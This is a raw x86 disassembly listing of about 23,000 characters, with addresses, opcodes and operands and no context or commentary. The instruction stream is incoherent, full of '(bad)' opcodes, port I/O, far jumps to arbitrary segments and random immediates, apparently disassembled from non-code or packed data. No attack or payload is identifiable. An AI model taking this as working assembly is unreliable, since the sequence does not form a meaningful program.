  446d93:	xlat   BYTE PTR ds:[ebx]
  446d94:	imul   ebp,DWORD PTR [edi],0xffffff9d
  446d97:	call   0xd7889908
  446d9c:	sbb    edi,DWORD PTR fs:[edx+eax*1]
  446da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446da1:	arpl   WORD PTR [edi],si
  446da3:	xlat   BYTE PTR ds:[ebx]
  446da4:	imul   edx,DWORD PTR [esi],0x68
  446da7:	in     al,dx
  446da8:	pop    esp
  446da9:	inc    ebx
  446daa:	push   esp
  446dab:	mov    dh,0x5c
  446dad:	xor    DWORD PTR [ebx-0x1a],ebx
  446db0:	data16 xor al,BYTE PTR [eax+0x6000a002]
  446db7:	jb     0x446d90
  446db9:	pop    esi
  446dba:	or     edx,DWORD PTR [ebx]
  446dbc:	out    0x5c,al
  446dbe:	adc    BYTE PTR [edi-0x15],ch
  446dc1:	dec    BYTE PTR gs:[esi]
  446dc4:	icebp  
  446dc5:	inc    esp
  446dc6:	pop    es
  446dc7:	xor    ebp,esp
  446dc9:	pusha  
  446dca:	std    
  446dcb:	adc    al,0xd0
  446dcd:	jmp    FWORD PTR [ebp-0x3]
  446dd0:	sti    
  446dd1:	push   ecx
  446dd2:	call   DWORD PTR [esi]
  446dd4:	jmp    0xc642:0xef1dd672
  446ddb:	and    esp,ebp
  446ddd:	jb     0x446d86
  446ddf:	enter  0xffc1,0x45
  446de3:	rol    DWORD PTR [ecx],1
  446de5:	aas    
  446de6:	(bad)  
  446de7:	in     al,dx
  446de8:	mov    ebp,0xe1f3b15c
  446ded:	pop    esi
  446dee:	(bad)  
  446def:	shl    bh,1
  446df1:	jb     0x446e55
  446df3:	and    esp,edi
  446df5:	push   ecx
  446df6:	xchg   esp,esp
  446df8:	aad    0x60
  446dfa:	xchg   ecx,eax
  446dfb:	aad    0xbb
  446dfd:	pusha  
  446dfe:	xchg   edx,eax
  446dff:	mov    edi,fs
  446e01:	jno    0x446e82
  446e03:	add    BYTE PTR [edx],0x2c
  446e06:	arpl   cx,bx
  446e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446e09:	fimul  WORD PTR [ecx+0x70f5cd1a]
  446e0f:	(bad)  
  446e10:	(bad)  
  446e12:	jl     0x446e1e
  446e14:	call   0x981fb91c
  446e19:	fiadd  WORD PTR [eax]
  446e1b:	add    ah,BYTE PTR ss:[ebp-0x36f5af22]
  446e22:	loopne 0x446e4a
  446e24:	sbb    al,ch
  446e26:	add    ecx,DWORD PTR [eax+ebx*8+0x1549dea6]
  446e2d:	stos   DWORD PTR es:[edi],eax
  446e2e:	mov    esi,0x581d935
  446e33:	adc    dh,ah
  446e35:	jl     0x446e23
  446e37:	es hlt 
  446e39:	jp     0x446e2f
  446e3b:	add    dh,dh
  446e3d:	jl     0x446e0f
  446e3f:	lea    ecx,[ebp-0xbbafd3f]
  446e45:	imul   eax,esp,0x1
  446e48:	add    BYTE PTR [eax-0x1e],bl
  446e4b:	cld    
  446e4c:	neg    DWORD PTR [ecx-0x20]
  446e4f:	sub    eax,edi
  446e51:	push   ebx
  446e52:	in     eax,0x65
  446e54:	lea    esp,[eax+0x33f6b102]
  446e5a:	ret    
  446e5b:	mov    BYTE PTR [edi],0x3b
  446e5e:	out    0xd3,eax
  446e60:	sub    DWORD PTR [edi],edi
  446e62:	repz inc ebp
  446e64:	(bad)  
  446e65:	repz add ch,BYTE PTR [esi-0x4f19f6f9]
  446e6c:	std    
  446e6d:	or     al,dh
  446e6f:	mov    ds,WORD PTR [esi]
  446e71:	add    eax,0xfefab0f3
  446e76:	loopne 0x446e95
  446e78:	(bad)  
  446e79:	loop   0x446e7f
  446e7b:	push   ebp
  446e7c:	imul   bl
  446e7e:	ret    0x8200
  446e81:	or     DWORD PTR [ecx],eax
  446e83:	std    
  446e84:	adc    cl,BYTE PTR [ebx]
  446e86:	pop    esp
  446e87:	jmp    0xae44b6ed
  446e8c:	add    al,BYTE PTR [ecx]
  446e8e:	dec    esp
  446e8f:	(bad)  ds:0x13cc6cfa
  446e95:	cs (bad) 
  446e97:	aad    0x61
  446e99:	rol    DWORD PTR [eax],cl
  446e9b:	stos   DWORD PTR es:[edi],eax
  446e9c:	ret    0x682b
  446e9f:	iret   
  446ea0:	mov    cl,0xf9
  446ea2:	addr16 (bad) 
  446ea4:	mov    ch,0x8c
  446ea6:	imul   BYTE PTR [eax+eiz*2+0x28]
  446eaa:	pop    esp
  446eab:	popf   
  446eac:	mov    al,ds:0xb29570f9
  446eb1:	or     bl,BYTE PTR [ecx+ebp*8+0x61]
  446eb5:	inc    esp
  446eb6:	add    BYTE PTR [esi-0x6fb1ff7e],ah
  446ebc:	jg     0x446eee
  446ebe:	data16 jbe 0x446e8e
  446ec1:	pop    ss
  446ec2:	add    DWORD PTR [edx+0x5e],edi
  446ec5:	int3   
  446ec6:	pop    ebx
  446ec7:	jne    0x446e73
  446ec9:	sub    eax,0x2b7f5a72
  446ece:	pop    esp
  446ecf:	ss cmp ax,0x2e00
  446ed4:	add    DWORD PTR [eax],0x4c
  446ed7:	pop    ecx
  446ed8:	inc    edx
  446ed9:	stc    
  446eda:	ins    BYTE PTR es:[edi],dx
  446edb:	dec    esp
  446edc:	xor    BYTE PTR [ebx],ch
  446ede:	addr16 jmp 0x2e446345
  446ee4:	add    BYTE PTR [ebx+0x0],al
  446ee7:	inc    esp
  446ee8:	inc    esp
  446ee9:	xor    DWORD PTR [edi],eax
  446eeb:	pusha  
  446eec:	push   cs
  446eed:	inc    ebx
  446eee:	sbb    DWORD PTR [ecx],eax
  446ef0:	xchg   ebx,eax
  446ef1:	popa   
  446ef2:	into   
  446ef3:	or     ax,0xf90e
  446ef7:	dec    DWORD PTR [di]
  446efa:	mov    esi,?
  446efc:	add    BYTE PTR [ebp-0x28],dl
  446eff:	xor    al,0x69
  446f01:	or     BYTE PTR [eax+0x7d587461],cl
  446f07:	cmp    eax,0x6186f865
  446f0c:	addr16 es fwait
  446f0f:	idiv   bh
  446f11:	test   eax,0x14733bd9
  446f16:	fwait
  446f17:	popa   
  446f18:	imul   esi,DWORD PTR [edi+0xe725f4d],0xb2746289
  446f22:	xchg   DWORD PTR [edx+0x65],esp
  446f25:	cld    
  446f26:	jns    0x446f90
  446f28:	gs test al,0x7b
  446f2b:	jae    0x446f2d
  446f2d:	mov    edi,0xda6841d7
  446f32:	mov    DWORD PTR [ebp+0x70],eax
  446f35:	retf   
  446f36:	js     0x446fa8
  446f38:	push   edi
  446f39:	mov    edx,edi
  446f3b:	push   ds
  446f3c:	add    al,cl
  446f3e:	jg     0x446fa1
  446f40:	jb     0x446f01
  446f42:	jb     0x446fab
  446f44:	or     DWORD PTR gs:[ebx-0x3dff000a],ebx
  446f4b:	aam    0x35
  446f4d:	gs pop ss
  446f4f:	mov    al,ds:0xa01d6f63
  446f54:	pop    esp
  446f55:	data16 sbb al,0xd5
  446f58:	mov    esi,0x61878700
  446f5d:	ja     0x446ef1
  446f5f:	js     0x446fc0
  446f61:	outs   dx,BYTE PTR ds:[esi]
  446f62:	cmp    edx,edi
  446f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446f65:	add    DWORD PTR [edx+ebp*4+0x6a],esi
  446f69:	push   ebx
  446f6a:	jb     0x446ef4
  446f6c:	push   0x65
  446f6e:	dec    esi
  446f6f:	xchg   edx,eax
  446f70:	push   ebp
  446f71:	je     0x446fbc
  446f73:	jle    0x446fd8
  446f75:	jae    0x446fd9
  446f77:	add    BYTE PTR [edx],0x5b
  446f7a:	arpl   WORD PTR [ebx-0x1e59942b],si
  446f80:	out    dx,eax
  446f81:	imul   ebx,DWORD PTR [ebx-0x71931326],0xffffffb9
  446f88:	ficomp WORD PTR [ebp-0x73]
  446f8b:	add    BYTE PTR [edx],0x63
  446f8e:	pusha  
  446f8f:	inc    ebx
  446f90:	repnz pop esp
  446f92:	jl     0x446fd7
  446f94:	jmp    0x446ffb
  446f96:	jle    0x446f2b
  446f98:	in     eax,0x52
  446f9a:	push   esi
  446f9b:	mov    eax,ds:0xa24568e6
  446fa0:	(bad)  
  446fa3:	pop    ss
  446fa4:	add    edx,DWORD PTR [ebx+0x3f]
  446fa7:	dec    esp
  446fa8:	(bad)  
  446fa9:	xor    BYTE PTR [di+0x5be3],dl
  446fae:	add    BYTE PTR [esi],bl
  446fb0:	pop    ebp
  446fb1:	icebp  
  446fb2:	push   0x36
  446fb4:	pop    ebx
  446fb5:	bnd jmp DWORD PTR [ebp+0xe430234]
  446fbc:	or     esi,ecx
  446fbe:	pop    esp
  446fbf:	push   ds
  446fc0:	pop    ebp
  446fc1:	icebp  
  446fc2:	push   0x16
  446fc4:	pop    ebx
  446fc5:	repnz inc DWORD PTR [ebp+0x73f022e]
  446fcc:	add    al,0xd2
  446fce:	jno    0x446fd5
  446fd0:	pop    ds
  446fd1:	(bad)  
  446fd2:	jb     0x446fc5
  446fd4:	ret    0x65e9
  446fd7:	(bad)  
  446fd8:	adc    ah,ah
  446fda:	push   edx
  446fdb:	(bad)  
  446fdc:	and    ecx,esi
  446fde:	push   0x6cfd22c5
  446fe3:	bound  edi,QWORD PTR [edi-0x333ca30e]
  446fe9:	aad    0x4e
  446feb:	retf   
  446fec:	retf   0x66e0
  446fef:	lods   eax,DWORD PTR ds:[esi]
  446ff0:	fnstcw WORD PTR [edx]
  446ff2:	lock ret 0x1105
  446ff6:	in     eax,0xbf
  446ff8:	and    ch,al
  446ffa:	add    esi,DWORD PTR [edx+0x7ce82ad9]
  447000:	push   es
  447001:	add    eax,0xfbfb7acd
  447006:	in     al,0x74
  447008:	es hlt 
  44700a:	loop   0x446f95
  44700c:	add    bh,dh
  44700e:	in     eax,0xf5
  447010:	mov    DWORD PTR [ebx+0x1],edx
  447013:	add    BYTE PTR [ecx+0x73d3cbf4],dl
  447019:	cli    
  44701a:	retf   0x50de
  44701d:	push   es
  44701e:	scas   eax,DWORD PTR es:[edi]
  44701f:	jmp    0x530:0xeccef53f
  447026:	leave  
  447027:	out    dx,eax
  447028:	cmp    bh,dl
  44702a:	mov    ebp,0xaad94303
  44702f:	icebp  
  447030:	push   ss
  447031:	clc    
  447032:	xchg   ebx,eax
  447033:	fisubr WORD PTR [ecx-0xc]
  447036:	call   0x9dcc:0x97fa39e8
  44703d:	mov    eax,edx
  44703f:	add    esp,DWORD PTR [ecx]
  447041:	add    DWORD PTR [ecx-0x5905e60f],ecx
  447047:	fdivp  st(6),st
  447049:	and    eax,ebp
  44704b:	add    eax,DWORD PTR [edi]
  44704d:	xlat   BYTE PTR ds:[ebx]
  44704e:	xchg   edi,eax
  44704f:	in     al,0xf0
  447051:	add    al,0x2d
  447053:	jmp    0xeb8d7648
  447058:	push   es
  447059:	and    ch,al
  44705b:	add    edx,DWORD PTR [ebx+ebx*8+0x2fc5e514]
  447062:	push   ecx
  447063:	idiv   BYTE PTR [ecx-0x671fb6f2]
  447069:	inc    BYTE PTR [eax]
  44706b:	xor    BYTE PTR [ecx],bl
  44706d:	mov    esi,esi
  44706f:	loope  0x4470d0
  447071:	adc    dh,BYTE PTR [edx+0x3b]
  447074:	cmp    edi,esp
  447076:	ins    BYTE PTR es:[edi],dx
  447077:	and    al,0x0
  447079:	inc    ebx
  44707a:	stc    
  44707b:	ins    BYTE PTR es:[edi],dx
  44707c:	adc    BYTE PTR [esi+0xa],ah
  44707f:	add    edi,DWORD PTR [ecx]
  447081:	or     al,0xf2
  447083:	data16 std 
  447085:	sub    dl,dh
  447087:	add    ax,0xf801
  44708b:	add    al,ch
  44708d:	data16 (bad) 
  44708f:	outs   dx,DWORD PTR ds:[esi]
  447090:	hlt    
  447091:	(bad)  
  447092:	cld    
  447093:	push   edx
  447094:	int3   
  447095:	add    al,0xf5
  447097:	add    BYTE PTR [edi+ebx*2+0x12],cl
  44709b:	addr16 (bad) 
  44709e:	or     dh,BYTE PTR [edx-0x3c]
  4470a1:	mov    esp,0xc4cc52f4
  4470a6:	hlt    
  4470a7:	add    BYTE PTR [ebx],dh
  4470a9:	pop    esi
  4470aa:	lds    esi,FWORD PTR [edx-0x38]
  4470ad:	mov    eax,0xcac65cc5
  4470b2:	mov    dh,dh
  4470b4:	sub    esp,DWORD PTR [edi-0x38]
  4470b7:	pop    ebx
  4470b8:	xchg   ebp,eax
  4470b9:	mov    cl,dh
  4470bb:	lea    ax,[eax-0x7480b809]
  4470c2:	inc    DWORD PTR [eax]
  4470c4:	out    dx,eax
  4470c5:	data16 (bad) 
  4470c7:	lea    esp,[di+0x5c2a]
  4470cc:	mov    dh,BYTE PTR [ebp-0x78]
  4470cf:	imul   BYTE PTR [esi+0x59601e5f]
  4470d5:	mov    ecx,esi
  4470d7:	inc    bp
  4470d9:	xor    edi,0x3f004650
  4470df:	(bad)  
  4470e0:	ins    BYTE PTR es:[edi],dx
  4470e1:	pop    edx
  4470e2:	pop    esi
  4470e3:	jmp    0x90d670ea
  4470e8:	inc    edi
  4470e9:	imul   edx,DWORD PTR [ebp+0x4b775f71],0x5802b8dc
  4470f3:	jb     0x447151
  4470f5:	fs jbe 0x44716a
  4470f8:	jae    0x44716d
  4470fa:	pop    edx
  4470fb:	je     0x447152
  4470fd:	push   esp
  4470fe:	bound  edi,QWORD PTR [edx+0x55]
  447101:	outs   dx,DWORD PTR ds:[esi]
  447102:	outs   dx,BYTE PTR ds:[esi]
  447103:	add    DWORD PTR [edi+0x0],0x6551df10
  44710a:	bt     DWORD PTR [ecx+0x6e],ebp
  44710e:	outs   dx,DWORD PTR ds:[esi]
  44710f:	jl     0x447178
  447111:	push   eax
  447112:	hlt    
  447113:	mov    ?,esi
  447115:	(bad)  
  447116:	out    dx,eax
  447117:	fdiv   QWORD PTR ds:0x5c9d0f65
  44711d:	arpl   WORD PTR [esi-0x46909572],bp
  447123:	(bad)  [ecx+eax*1+0x576a70fc]
  44712a:	mov    dl,0x79
  44712c:	pop    edx
  44712d:	outs   dx,DWORD PTR ds:[esi]
  44712e:	cld    
  44712f:	inc    edi
  447130:	pop    edi
  447131:	outs   dx,BYTE PTR ds:[esi]
  447132:	pushf  
  447133:	mov    ds:0xdc99fff6,al
  447138:	xor    eax,0x629ecf65
  44713d:	popa   
  44713e:	clc    
  44713f:	mov    es,WORD PTR [edx+0x6f]
  447142:	add    BYTE PTR ds:0xe1004773,dl
  447148:	fdiv   QWORD PTR ds:0x61ac0f65
  44714e:	jb     0x44713e
  447150:	jns    0x4471bc
  447152:	add    BYTE PTR [ecx-0x23],al
  447155:	xor    eax,0x69a20f65
  44715a:	outs   dx,BYTE PTR ds:[esi]
  44715b:	pop    ds
  44715c:	jp     0x4471c5
  44715e:	push   edx
  44715f:	bound  edx,QWORD PTR ds:0x6a626bdc
  447165:	add    bh,BYTE PTR [edi]
  447167:	mov    esp,0x1cb468d7
  44716d:	loopne 0x4471dd
  44716f:	bound  edi,QWORD PTR [ecx-0x3]
  447172:	push   edx
  447173:	mov    edi,0xbc68d7cc
  447178:	aam    0xdf
  44717a:	outs   dx,BYTE PTR ds:[esi]
  44717b:	xchg   esi,eax
  44717c:	xlat   BYTE PTR ds:[ebx]
  44717d:	loop   0x4471dd
  44717f:	mov    ch,0x70
  447181:	add    ah,BYTE PTR [edi+0x61]
  447184:	iret   
  447185:	fldenv [ebp-0x7a]
  447188:	out    dx,eax
  447189:	idiv   DWORD PTR ds:0x4fd5d790
  44718f:	(bad)  
  447190:	(bad)  
  447192:	imul   esp,DWORD PTR [edx-0x64],0xfffffffc
  447196:	inc    ebx
  447197:	jge    0x44712a
  447199:	fimul  WORD PTR [eax+0x77]
  44719c:	xchg   ecx,eax
  44719d:	jmp    0x2b4a6fe
  4471a2:	mov    al,0x63
  4471a4:	aas    
  4471a5:	fild   QWORD PTR [ebx+0x0]
  4471a8:	ss scas eax,DWORD PTR es:[edi]
  4471aa:	repnz dec esi
  4471ac:	cmp    edx,DWORD PTR [esi+0x703566de]
  4471b2:	add    bh,ch
  4471b4:	bound  edi,QWORD PTR ds:0x473668ea
  4471ba:	(bad)  [ebp+0x3e]
  4471bd:	push   edi
  4471be:	stc    
  4471bf:	jb     0x4471e8
  4471c1:	push   0x4c613202
  4471c6:	loope  0x447214
  4471c8:	cld    
  4471c9:	push   0x5cfe66dd
  4471ce:	add    bl,BYTE PTR [eax+0x63]
  4471d1:	aaa    
  4471d2:	fild   QWORD PTR [ebx+0x29]
  4471d5:	pop    ebp
  4471d6:	jmp    0x447239
  4471d8:	std    
  4471d9:	fmul   DWORD PTR [eax-0xa]
  4471dc:	or     DWORD PTR [edx],ebp
  4471de:	dec    esp
  4471df:	jecxz  0x4471aa
  4471e1:	cld    
  4471e2:	out    0x3,eax
  4471e4:	mov    ecx,ebx
  4471e6:	sub    bl,ah
  4471e8:	ret    0x2c0b
  4471eb:	loope  0x4471a1
  4471ed:	cld    
  4471ee:	cmp    ebx,eax
  4471f0:	cmp    eax,0x76d51586
  4471f5:	sub    edi,ebx
  4471f7:	xor    eax,0xe00bfd84
  4471fc:	and    eax,0xb0060986
  447201:	cld    
  447202:	push   es
  447203:	lds    edx,FWORD PTR [ebx-0x5107f704]
  447209:	adc    al,BYTE PTR ds:0x14600eb
  44720f:	(bad)  
  447211:	in     al,dx
  447212:	ficomp DWORD PTR [ecx]
  447214:	out    0x94,eax
  447216:	sub    ch,ch
  447218:	out    0x73,al
  44721a:	add    BYTE PTR [esi-0x42f37e1e],dh
  447220:	(bad)  
  447221:	push   ebp
  447222:	cs call 0xba1f5d2b
  447228:	out    0x2c,al
  44722a:	push   ss
  44722b:	mov    eax,0xbd123fe6
  447230:	jmp    0xdb1a:0x397017e
  447237:	cdq    
  447238:	out    0xc,al
  44723a:	sbb    cl,BYTE PTR [eax+eiz*8-0x194d03d0]
  447241:	sbb    bl,cl
  447243:	inc    ebp
  447244:	add    eax,0xd47efc30
  447249:	cs or  eax,0xc01e296
  44724f:	jge    0x447217
  447251:	cmc    
  447252:	sub    eax,0xa761e901
  447257:	add    DWORD PTR [edx+0x5d710077],ebp
  44725d:	mov    WORD PTR [ebx+esi*2],fs
  447260:	push   eax
  447261:	inc    esp
  447262:	add    dl,BYTE PTR [edx+0x40]
  447265:	cmp    eax,0x4b555fff
  44726a:	or     ebx,DWORD PTR [esi+ebx*1+0x5e]
  44726e:	xchg   esi,eax
  44726f:	add    DWORD PTR [edx],ebp
  447271:	add    BYTE PTR [eax],dh
  447273:	add    dh,BYTE PTR [ecx+0x3d]
  447276:	sbb    eax,0x3b226d26
  44727b:	add    dl,BYTE PTR [ecx+0x8]
  44727e:	xor    dl,bh
  447280:	arpl   cx,bp
  447282:	popa   
  447283:	lahf   
  447284:	add    DWORD PTR [edx],ebp
  447286:	adc    BYTE PTR [edx],al
  447288:	jno    0x44729f
  44728a:	iret   
  44728b:	std    
  44728c:	jo     0x4472a4
  44728e:	adc    cl,dh
  447290:	dec    ecx
  447291:	add    al,0xf
  447293:	test   esi,esi
  447295:	scas   al,BYTE PTR es:[edi]
  447296:	pop    esi
  447297:	sbb    BYTE PTR [ebx-0x10],dh
  44729a:	icebp  
  44729b:	lock cmp al,0xcc
  44729e:	lock lock jb 0x447270
  4472a2:	into   
  4472a3:	subps  xmm2,xmm0
  4472a6:	popa   
  4472a7:	inc    ebx
  4472a8:	add    DWORD PTR [edx-0x428efe2d],ebp
  4472ae:	popf   
  4472af:	and    eax,0xfbb3b572
  4472b4:	ja     0x447257
  4472b6:	mov    esi,0x61e96907
  4472bb:	out    0x2,eax
  4472bd:	mov    dh,0xb1
  4472bf:	and    eax,0xfb93b967
  4472c4:	popa   
  4472c5:	mov    WORD PTR [eax-0x5781b2f9],ss
  4472cb:	and    eax,0xd87b0067
  4472d0:	imul   eax,DWORD PTR [ecx],0x536a71c4
  4472d6:	add    dl,ah
  4472d8:	jl     0x44732d
  4472da:	jne    0x4472b5
  4472dc:	popf   
  4472dd:	gs je  0x4472f3
  4472e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4472e1:	jo     0x44734c
  4472e3:	mov    bh,0x76
  4472e5:	idiv   bh
  4472e7:	push   esp
  4472e8:	fidivr DWORD PTR ds:0x4aa3a670
  4472ee:	push   0x64617289
  4472f3:	push   edi
  4472f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4472f5:	imul   esp,DWORD PTR [ebp-0x63],0xffffffdd
  4472f9:	pop    esp
  4472fa:	add    DWORD PTR [edx+esi*2+0x7152536a],eax
  447301:	push   ebx
  447302:	jne    0x44736d
  447304:	sahf   
  447305:	gs je  0x44736b
  447308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447309:	jo     0x447374
  44730b:	ja     0x447383
  44730d:	inc    ebx
  44730e:	outs   dx,DWORD PTR ds:[esi]
  44730f:	push   es
  447310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447311:	push   0x0
  447313:	ins    BYTE PTR es:[edi],dx
  447314:	fidiv  WORD PTR ds:0x5fabf765
  44731a:	imul   esp,DWORD PTR [esi-0x5d],0x49
  44731e:	outs   dx,BYTE PTR ds:[esi]
  44731f:	adc    eax,0xaa6d70a3
  447324:	mov    ebp,DWORD PTR [ecx+0x6f]
  447327:	popf   
  447328:	xlat   BYTE PTR ds:[ebx]
  447329:	mov    DWORD PTR [eax],eax
  44732b:	clc    
  44732c:	mov    DWORD PTR [ebp+0x61],edx
  44732f:	pop    es
  447330:	jno    0x447378
  447332:	jb     0x4472e0
  447334:	jbe    0x44738b
  447336:	jae    0x447330
  447338:	pushf  
  447339:	jae    0x447390
  44733b:	add    al,ch
  44733d:	jo     0x4473af
  44733f:	push   edi
  447340:	mov    ebx,0xcf019bd7
  447345:	mov    ds:0x65626b5f,al
  44734a:	repnz dec edi
  44734c:	adc    BYTE PTR [ecx-0x14],bl
  44734f:	push   0x5cdf54f6
  447354:	adc    al,0x51
  447356:	(bad)  
  447357:	ins    BYTE PTR es:[edi],dx
  447358:	jmp    DWORD PTR [edx+0x2]
  44735b:	pop    ss
  44735c:	bound  esi,QWORD PTR [ecx]
  44735e:	fisubr WORD PTR [ecx-0x11]
  447361:	push   ds
  447362:	stc    
  447363:	dec    ebx
  447364:	int    0x27
  447366:	fisub  WORD PTR [ebp-0x4e]
  447369:	push   ds
  44736a:	fisubr DWORD PTR [ebp-0x45]
  44736d:	(bad)  
  44736e:	fstp   QWORD PTR [esi-0x41]
  447371:	mov    edi,0xc96384fc
  447376:	(bad)  
  447377:	push   0x63e219ae
  44737c:	mov    ebx,0xbf52ddc6
  447381:	iret   
  447382:	in     eax,dx
  447383:	jno    0x447310
  447385:	in     al,dx
  447386:	jmp    0xe023f2c6
  44738b:	jno    0x447408
  44738d:	loopne 0x447387
  44738f:	xchg   ax,ax
  447391:	jo     0x447395
  447393:	jecxz  0x4473f5
  447395:	(bad)  
  447397:	imul   edx,DWORD PTR [ecx+0x706cdfd5],0xffffffd9
  44739e:	clc    
  44739f:	js     0x4473a1
  4473a1:	sahf   
  4473a2:	xchg   ebp,eax
  4473a3:	icebp  
  4473a4:	bound  edx,QWORD PTR [eax-0x57]
  4473a7:	repnz imul eax,DWORD PTR [ebp-0x62],0xffffffbe
  4473ac:	pusha  
  4473ad:	inc    ecx
  4473ae:	inc    esp
  4473af:	add    al,BYTE PTR [ecx+0x65d52f62]
  4473b5:	xor    al,0x9d
  4473b7:	lock imul edx,DWORD PTR [ecx],0x44
  4473bb:	lock push 0x5cd19b3c
  4473c1:	inc    ecx
  4473c2:	fst    DWORD PTR [ecx+esi*8-0x385ef2f6]
  4473c9:	ss push es
  4473cb:	mov    esi,ecx
  4473cd:	cli    
  4473ce:	or     BYTE PTR [esp+ebx*8-0x2f70d2ed],cl
  4473d5:	push   ds
  4473d6:	imul   BYTE PTR [ecx+esi*8+0xa]
  4473da:	or     eax,0x60ec771
  4473df:	mov    esi,ecx
  4473e1:	cli    
  4473e2:	or     BYTE PTR [ebp+ebx*8-0x2d],dl
  4473e6:	sub    ch,al
  4473e8:	add    eax,ebx
  4473ea:	fsub   DWORD PTR [esi]
  4473ec:	out    0xb9,eax
  4473ee:	es cmp eax,0x5107b6e1
  4473f4:	clc    
  4473f5:	mov    edx,0xc0f13d1d
  4473fa:	pop    es
  4473fb:	inc    ecx
  4473fc:	hlt    
  4473fd:	mov    ecx,0xc2d139f2
  447402:	test   BYTE PTR [ebx],0x4
  447405:	add    BYTE PTR ds:0x89e73ad7,bh
  44740b:	es add eax,0x1077ee1
  447411:	clc    
  447412:	mov    bl,BYTE PTR ds:0x780f105
  447418:	adc    esp,esi
  44741a:	mov    edx,esi
  44741c:	stc    
  44741d:	rol    BYTE PTR [edx-0x30fc0c0a],1
  447423:	xlat   BYTE PTR ds:[ebx]
  447424:	mov    al,0xf0
  447426:	sub    al,0xfc
  447428:	ret    
  447429:	fild   QWORD PTR [eax]
  44742b:	repz mov esi,0xc12647f4
  447431:	out    0xc5,eax
  447433:	xor    DWORD PTR [edx-0x540382fe],0xf316bf
  44743d:	into   
  44743e:	mov    ch,0xf9
  447440:	push   ecx
  447441:	sar    BYTE PTR [ebp+0x61a2f681],0x16
  447448:	data16 (bad) 
  44744a:	(bad)  
  44744b:	and    al,0x73
  44744d:	popf   
  44744e:	mov    dl,0xf0
  447450:	pop    esp
  447451:	mov    ch,0xa6
  447453:	es ins DWORD PTR es:[edi],dx
  447455:	jnp    0x4473ef
  447457:	sti    
  447458:	pop    ebp
  447459:	call   0xe161:0xe94e1d98
  447460:	jmp    DWORD PTR [ebx+0x555ff470]
  447466:	xor    eax,0xe95cf2
  44746b:	popa   
  44746c:	ins    BYTE PTR es:[edi],dx
  44746d:	add    BYTE PTR [eax],ah
  44746f:	sub    dl,dh
  447471:	ins    BYTE PTR es:[edi],dx
  447472:	inc    eax
  447473:	aas    
  447474:	cmc    
  447475:	pop    ebx
  447476:	sbb    cl,BYTE PTR [edi+0xc]
  447479:	ins    DWORD PTR es:[edi],dx
  44747a:	inc    esp
  44747b:	sbb    ebp,DWORD PTR [ecx+ebp*2]
  44747e:	cmp    al,0x32
  447480:	and    eax,0xbe083666
  447485:	js     0x4474c5
  447487:	lea    ax,[ecx]
  44748a:	sub    cl,BYTE PTR [edx+eax*1]
  44748d:	jno    0x4474ac
  44748f:	and    DWORD PTR [esi],ebx
  447491:	ins    DWORD PTR es:[edi],dx
  447492:	and    edi,edi
  447494:	or     ebp,DWORD PTR [ecx+0x19]
  447497:	pop    es
  447498:	or     esp,DWORD PTR [eax+0xc]
  44749b:	pop    esi
  44749c:	call   0xf571:0x1f42a01
  4474a3:	push   ds
  4474a4:	cld    
  4474a5:	outs   dx,DWORD PTR ds:[esi]
  4474a6:	fdivr  QWORD PTR [esi-0x4755a3f6]
  4474ac:	imul   BYTE PTR [esp+ecx*8-0x47]
  4474b0:	hlt    
  4474b1:	dec    ebp
  4474b2:	jmp    0x461918
  4474b7:	or     BYTE PTR [edi-0x59108f87],al
  4474bd:	push   ebp
  4474be:	ins    BYTE PTR es:[edi],dx
  4474bf:	sahf   
  4474c0:	jne    0x447535
  4474c2:	gs clc 
  4474c4:	mov    ds:0x74ee745c,eax
  4474c9:	push   0x0
  4474cb:	dec    eax
  4474cc:	aad    0x41
  4474ce:	jb     0x4474d0
  4474d0:	repnz mov WORD PTR [edx+0x43],gs
  4474d4:	jmp    0xeeb8d652
  4474d9:	inc    esp
  4474da:	popa   
  4474db:	jae    0x4474b0
  4474dd:	(bad)  
  4474df:	add    BYTE PTR [eax-0x108f867a],bh
  4474e5:	inc    ebx
  4474e6:	popa   
  4474e7:	jae    0x44749c
  4474e9:	cdq    
  4474ea:	popa   
  4474eb:	je     0x447497
  4474ed:	aad    0x3f
  4474ef:	inc    esp
  4474f0:	lea    edx,[esi-0x3897b6ba]
  4474f6:	push   ds
  4474f7:	fs xchg edi,eax
  4474f9:	mov    eax,ds:0xdcb1fff6
  4474fe:	push   eax
  4474ff:	popa   
  447500:	outs   dx,DWORD PTR ds:[esi]
  447501:	popf   
  447502:	push   eax
  447503:	data16 movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  447506:	fs gs dec ecx
  447509:	jbe    0x44756e
  44750b:	imul   edi,DWORD PTR [eax-0x5f],0x61
  44750f:	jae    0x447574
  447511:	lods   al,BYTE PTR ds:[esi]
  447512:	idiv   bh
  447514:	gs aad 0x50
  447517:	popa   
  447518:	jmp    DWORD PTR [ebx+0x79656934]
  44751e:	xor    al,0x69
  447520:	addr16 jp 0x44755f
  447523:	popa   
  447524:	out    0x78,al
  447526:	inc    edi
  447527:	add    BYTE PTR [ebx-0x24],bl
  44752a:	push   eax
  44752b:	popa   
  44752c:	scas   eax,DWORD PTR es:[edi]
  44752d:	mov    ds:0x95626550,eax
  447532:	fld    TBYTE PTR [ebp+0x0]
  447535:	aas    
  447536:	cmp    ch,dl
  447538:	arpl   WORD PTR [edi+0x63],ax
  44753b:	repnz pop esp
  44753d:	inc    ecx
  44753e:	add    bl,BYTE PTR [si]
  447541:	arpl   WORD PTR [ebx-0x1a],sp
  447544:	jno    0x447567
  447546:	cmp    eax,0x722345f2
  44754b:	add    dh,BYTE PTR [edx+eiz*2+0x73bba43]
  447552:	push   esi
  447553:	loope  0x4475c0
  447555:	inc    DWORD PTR [edi-0x23]
  447558:	arpl   di,si
  44755a:	dec    esp
  44755b:	sar    edi,cl
  44755d:	jne    0x447578
  44755f:	add    dl,BYTE PTR [ebx+0x1a]
  447562:	cs loope 0x4475c8
  447565:	inc    DWORD PTR ds:0xf9c74ae1
  44756b:	iret   
  44756c:	call   DWORD PTR [ebp+0x59]
  44756f:	std    
  447570:	dec    edi
  447571:	ret    
  447572:	sbb    al,0xd5
  447574:	push   edx
  447575:	mov    ecx,0xcd51ed19
